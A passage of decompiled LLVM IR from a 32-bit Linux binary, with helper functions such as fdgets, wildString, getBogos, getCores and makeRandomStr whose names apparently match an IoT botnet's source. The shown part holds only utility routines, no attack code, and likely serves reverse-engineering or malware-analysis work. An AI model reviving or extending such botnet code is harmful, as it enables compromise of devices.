dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_8060540.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_8060540.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_8060540.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8058520.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp13, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp13, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp13, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp13, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.7 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.7, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_8048e37 ], [ %storemerge5, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f12 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f12, i32* %stack_var_-4, align 4
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  %v2_8048f3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v2_8048f3f = phi i32 [ %v2_8048f3f.pre, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v0_8048f12, %entry ]
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  store i32 %v2_8048f3f, i32* @ebp, align 4
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f5a = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058920.18, i32 0, i32 0), i32 0)
  %v2_80490ba = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490d224 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d725 = icmp eq i32 %v5_80490d224, 0
  %v1_80490d927 = icmp eq i1 %v1_80490d725, false
  br i1 %v1_80490d927, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_8048f67:                             ; preds = %entry, %dec_label_pc_8049099
  %v3_8048f70 = call i32 @uppercase(i8* %tmp22)
  %v5_8048f86 = call i32 @strstr(i32 %v2_80490ba, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805892e.19, i32 0, i32 0))
  %v12_8048f93 = icmp eq i32 %v5_8048f86, %v2_80490ba
  %v1_8048f95 = icmp eq i1 %v12_8048f93, false
  br i1 %v1_8048f95, label %dec_label_pc_8049099, label %dec_label_pc_8048f9b

dec_label_pc_8048f9b:                             ; preds = %dec_label_pc_8048f67
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fa9:                             ; preds = %dec_label_pc_8048fc0, %dec_label_pc_8048fb6, %dec_label_pc_8048fac
  %v5_8048fa9 = add i32 %v4_8048fac, 1
  %v22_8048fa9 = inttoptr i32 %v5_8048fa9 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fac:                             ; preds = %dec_label_pc_8048f9b, %dec_label_pc_8048fa9
  %storemerge4 = phi i8* [ %v22_8048fa9, %dec_label_pc_8048fa9 ], [ %tmp23, %dec_label_pc_8048f9b ]
  %v4_8048fac = ptrtoint i8* %storemerge4 to i32
  %v2_8048faf = load i8, i8* %storemerge4, align 1
  %v7_8048fb2 = icmp eq i8 %v2_8048faf, 32
  br i1 %v7_8048fb2, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048fac
  %v2_8048fb9 = load i8, i8* %storemerge4, align 1
  %v10_8048fbc = icmp eq i8 %v2_8048fb9, 9
  br i1 %v10_8048fbc, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fc0

dec_label_pc_8048fc0:                             ; preds = %dec_label_pc_8048fb6
  %v2_8048fc3 = load i8, i8* %storemerge4, align 1
  %v10_8048fc6 = icmp eq i8 %v2_8048fc3, 58
  br i1 %v10_8048fc6, label %dec_label_pc_8048fa9, label %dec_label_pc_8048ff1.preheader

dec_label_pc_8048ff1.preheader:                   ; preds = %dec_label_pc_8048fc0
  br label %dec_label_pc_8048ff1

dec_label_pc_8048fcc:                             ; preds = %dec_label_pc_804901a, %dec_label_pc_8048ff1
  %v3_8048fe3 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fea = add i32 %v4_8048fac, %v3_8048fe3
  %v1_8048fed = add i32 %v6_8048fea, -1
  %v1_8048fee = inttoptr i32 %v1_8048fed to i8*
  store i8 0, i8* %v1_8048fee, align 1
  br label %dec_label_pc_8048ff1

dec_label_pc_8048ff1:                             ; preds = %dec_label_pc_8048ff1.preheader, %dec_label_pc_8048fcc
  %v3_8049008 = call i32 @_strlen(i8* %storemerge4)
  %v6_804900f = add i32 %v4_8048fac, %v3_8049008
  %v1_8049012 = add i32 %v6_804900f, -1
  %v1_8049013 = inttoptr i32 %v1_8049012 to i8*
  %v2_8049013 = load i8, i8* %v1_8049013, align 1
  %v10_8049016 = icmp eq i8 %v2_8049013, 13
  br i1 %v10_8049016, label %dec_label_pc_8048fcc, label %dec_label_pc_804901a

dec_label_pc_804901a:                             ; preds = %dec_label_pc_8048ff1
  store i1 false, i1* @df, align 1
  store i32 %v4_8048fac, i32* @edi, align 4
  %v3_8049031 = call i32 @_strlen(i8* %storemerge4)
  %v6_8049038 = add i32 %v4_8048fac, %v3_8049031
  %v1_804903b = add i32 %v6_8049038, -1
  %v1_804903c = inttoptr i32 %v1_804903b to i8*
  %v2_804903c = load i8, i8* %v1_804903c, align 1
  %v10_804903f = icmp eq i8 %v2_804903c, 10
  br i1 %v10_804903f, label %dec_label_pc_8048fcc, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804901a
  %v5_8049051 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8049056 = icmp eq i32 %v5_8049051, 0
  br i1 %v1_8049056, label %dec_label_pc_8049070, label %dec_label_pc_804905a

dec_label_pc_804905a:                             ; preds = %dec_label_pc_8049043
  %v5_8049068 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8049068 = inttoptr i32 %v5_8049068 to i8*
  store i8 0, i8* %v6_8049068, align 1
  br label %dec_label_pc_8049070

dec_label_pc_8049070:                             ; preds = %dec_label_pc_8049043, %dec_label_pc_804905a
  store i32 %v4_8048fac, i32* @eax, align 4
  %v4_804907a = inttoptr i32 %arg1 to i8*
  %v5_804907d = call i32 @strcpy(i8* %v4_804907a, i32 %v4_8048fac)
  %v2_8049088 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_8049099:                             ; preds = %dec_label_pc_8048f67
  %v6_80490b5 = call i32 @__GI_memset(i8* %tmp22, i32 0, i32 4096)
  %v5_80490d2 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d7 = icmp eq i32 %v5_80490d2, 0
  %v1_80490d9 = icmp eq i1 %v1_80490d7, false
  br i1 %v1_80490d9, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_80490df:                             ; preds = %dec_label_pc_8049099, %entry
  %v2_80490e5 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_80490f4:                             ; preds = %dec_label_pc_8049070, %dec_label_pc_80490df
  %storemerge = phi i32 [ 1, %dec_label_pc_80490df ], [ 0, %dec_label_pc_8049070 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048fac, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490ba, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048f5a, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80490f4, { 1, 0 }
  uselistorder label %dec_label_pc_8049070, { 1, 0 }
  uselistorder label %dec_label_pc_8048ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8048fac, { 1, 0 }
  uselistorder label %dec_label_pc_8048f67, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049103 = load i32, i32* @ebp, align 4
  store i32 %v0_8049103, i32* %stack_var_-4, align 4
  %v4_8049103 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049103, i32* @ebp, align 4
  %v5_8049122 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058920.18, i32 0, i32 0), i32 0)
  %v2_8049180 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804919811 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d12 = icmp eq i32 %v5_804919811, 0
  %v1_804919f14 = icmp eq i1 %v1_804919d12, false
  br i1 %v1_804919f14, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_804912c:                             ; preds = %entry, %dec_label_pc_804915f
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804915f ], [ 0, %entry ]
  %v3_8049135 = call i32 @uppercase(i8* %tmp10)
  %v5_804914b = call i32 @strstr(i32 %v2_8049180, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805892e.19, i32 0, i32 0))
  %v12_8049158 = icmp eq i32 %v5_804914b, %v2_8049180
  %v1_804915a = icmp eq i1 %v12_8049158, false
  br i1 %v1_804915a, label %dec_label_pc_804915f, label %dec_label_pc_804915c

dec_label_pc_804915c:                             ; preds = %dec_label_pc_804912c
  %v4_804915c = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %dec_label_pc_804912c, %dec_label_pc_804915c
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_804912c ], [ %v4_804915c, %dec_label_pc_804915c ]
  %v6_804917b = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_8049198 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d = icmp eq i32 %v5_8049198, 0
  %v1_804919f = icmp eq i1 %v1_804919d, false
  br i1 %v1_804919f, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804915f, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804915f ]
  %v2_80491a7 = call i32 @__libc_close(i32 %v5_8049122)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049180, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8049122, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804915f, { 1, 0 }
  uselistorder label %dec_label_pc_804912c, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491b1 = load i32, i32* @ebp, align 4
  store i32 %v0_80491b1, i32* %stack_var_-4, align 4
  %v0_80491b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80491b4, i32* %stack_var_-8, align 4
  %v5_80491cd = ptrtoint i8* %arg1 to i32
  %v5_804921325 = icmp sgt i32 %arg2, 0
  br i1 %v5_804921325, label %dec_label_pc_80491c8, label %dec_label_pc_8049215

dec_label_pc_80491c8:                             ; preds = %entry, %dec_label_pc_80491c8
  %storemerge26 = phi i32 [ %v4_804920a, %dec_label_pc_80491c8 ], [ 0, %entry ]
  %v6_80491cd = add i32 %storemerge26, %v5_80491cd
  store i32 %v6_80491cd, i32* @ebx, align 4
  %v1_80491d0 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_80491e5 = udiv i32 %v1_80491d0, 26
  %tmp = mul i32 %v2_80491e5, -10
  %v2_80491fd = add i32 %v1_80491d0, %tmp
  %v14_80491fd = trunc i32 %v2_80491fd to i8
  %v2_8049206 = add i8 %v14_80491fd, 65
  %v2_8049208 = load i32, i32* @ebx, align 4
  %v3_8049208 = inttoptr i32 %v2_8049208 to i8*
  store i8 %v2_8049206, i8* %v3_8049208, align 1
  %v4_804920a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_804920a, %arg2
  br i1 %exitcond, label %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, label %dec_label_pc_80491c8

dec_label_pc_804920d.dec_label_pc_8049215_crit_edge: ; preds = %dec_label_pc_80491c8
